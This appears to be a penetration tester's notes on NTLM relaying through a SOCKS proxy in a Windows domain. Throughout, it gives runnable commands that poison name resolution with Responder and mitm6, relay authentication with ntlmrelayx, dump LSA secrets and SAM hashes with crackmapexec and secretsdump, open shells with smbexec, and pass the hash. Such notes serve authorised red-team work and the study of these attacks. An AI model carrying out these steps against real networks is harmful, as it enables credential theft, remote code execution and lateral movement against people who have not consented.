## Socks Proxy Relaying

Configure Responder withÂ `SMB`Â andÂ `HTTP`Â turned off inÂ `/etc/responder/Responder.conf`

``````
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On 
Kerberos = On
FTP = On 
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On  
LDAP = On
``````

````
sudo responder -I eth0 -r -d -w
````


Make sure /etc/proxychains.conf is configured to use portÂ 1080

Find machines with SMB signing disabled

```
cme smb <networkIP>/<cidr> --gen-relay-list relayTargets.txt
```

Run ntlmrelayx.py

``````

sudo python3 ntlmrelayx.py -tf ~/Desktop/targets -socks -smb2support

``````

^a8df20

typeÂ `socks`Â into our relay prompt to see the active connections available.

Look for a connection that has AdminStatus set to true.

Instead of abusing LLMNR and other older protocols, we can use `mitm6` to abuse IPv6. The idea is to reply to DHCPv6 requests made by machines on the network to set the attacker IP as the default IPv6 DNS server in order to force victims to authenticate against our attacker machine(you have to turn off dns in responder.conf). ^331793

More details here: [[mitm6.py]]

```
sudo mitm6 -d testdomain.local
```

Use proxychains with crackmapexec to use these sessions. The password we provide is arbitrary since the SOCKS proxy is going to use the session we gained from relaying auth previously. The IP and user should come from the output of running socks in ntlmrelayx.py.

`proxychains cme smb 10.1.1.206 -u user -p pass -d Domain --lsa

Using the --lsa will dump hashes and clear text passwords from registry secrets. Using --sam will obtain local account hashes.


secretsdump.py from impacket will also dump local hashes

```
proxychains ./secretsdump.py vulnerable/Administrator@192.168.48.230
```

Or you can get a shell with Impackets smbexec
```
proxychains smbexec.py <domain>/<relayedUser>@192.168.10.60
```



Validate any clear text passwords or hashes that were cracked work using crackmapexec. 

`proxychains cme smb 10.1.1.1/24 -u user -p pass -d Domain


You can also passthehash with crackmapexec if you get ntlmv1 hashes.


`proxychains cme smb 10.1.1.1/24 -u user -H hashgoeshere -d Domain


You can use bloodhound to see if those accounts have local admin on any other machine and dump lsa and sam from them.
